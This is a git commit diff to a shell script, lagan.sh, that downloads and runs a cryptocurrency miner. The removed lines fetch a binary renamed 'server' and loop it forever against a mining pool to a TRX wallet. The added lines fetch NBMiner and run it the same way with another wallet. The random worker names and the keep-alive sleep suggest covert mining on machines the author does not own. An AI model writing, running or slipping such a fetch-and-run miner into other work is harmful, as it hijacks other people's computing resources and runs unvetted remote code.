c2ca52500dbf93ea173fb68f450df6d1d8269b0e
developer49 <89978906+developer49@users.noreply.github.com>
2021-09-03 04:04:14 +0430

    Update lagan.sh

--- lagan.sh
+++ lagan.sh
@@ -1,11 +1,5 @@
-#!/bin/bash
-POOL=ethash.unmineable.com:3333
-WALLET=TRX:TUxbPLqKPtdvtGTFfAYmqJLdzjBhQuWSVU
-WORKER=$(echo $(shuf -i 10-40 -n 1)-COLN#im8m-ybvt)
-wget https://github.com/developer49/server/raw/main/server
-chmod +x server
-while [ 1 ]; do
-./server -a ethash -o stratum+tcp://$POOL -u $WALLET.$WORKER -log
-sleep 5
-done
-sleep 999999999 
+#bin/bash
+wget https://github.com/NebuTech/NBMiner/releases/download/v39.2/NBMiner_39.2_Linux.tgz
+tar -xvf NBMiner_39.2_Linux.tgz
+cd NBMiner_Linux
+./nbminer -a ethash -o stratum+tcp://ethash.unmineable.com:3333 -u TRX:TDUyaKcbhFGViyBHarTtPuHhHk9mXm84th.$(echo $(shuf -i 10-40 -n 1)-COLN#im8m-ybvt) -log
